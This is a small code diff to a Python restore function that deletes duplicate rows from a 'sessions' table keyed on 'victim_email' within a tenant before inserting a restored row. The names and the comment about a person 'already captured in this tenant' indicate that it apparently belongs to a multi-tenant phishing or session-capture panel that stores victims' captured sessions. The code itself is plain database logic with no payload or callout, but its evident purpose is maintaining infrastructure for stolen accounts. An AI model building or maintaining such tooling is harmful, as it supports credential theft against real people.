@@ -276,6 +276,20 @@ def restore_from_file(filepath, owner_id=None):
         for row in rows:
             d = dict(row)
             old_uc = d.get('user_code')
+            # Same person already captured in this tenant? Replace that row
+            # rather than leaving a stale duplicate beside the restored one.
+            email = (d.get('victim_email') or '').strip().lower()
+            if email and email != 'unknown':
+                if owner_id is None:
+                    stale = live.execute(
+                        "SELECT user_code FROM sessions WHERE LOWER(TRIM(victim_email)) = ? "
+                        "AND owner_id IS NULL", (email,)).fetchall()
+                else:
+                    stale = live.execute(
+                        "SELECT user_code FROM sessions WHERE LOWER(TRIM(victim_email)) = ? "
+                        "AND owner_id = ?", (email, owner_id)).fetchall()
+                for (suc,) in stale:
+                    live.execute("DELETE FROM sessions WHERE user_code = ?", (suc,))
             new_uc = old_uc
             if live.execute("SELECT 1 FROM sessions WHERE user_code = ?", (new_uc,)).fetchone():
                 i = 2
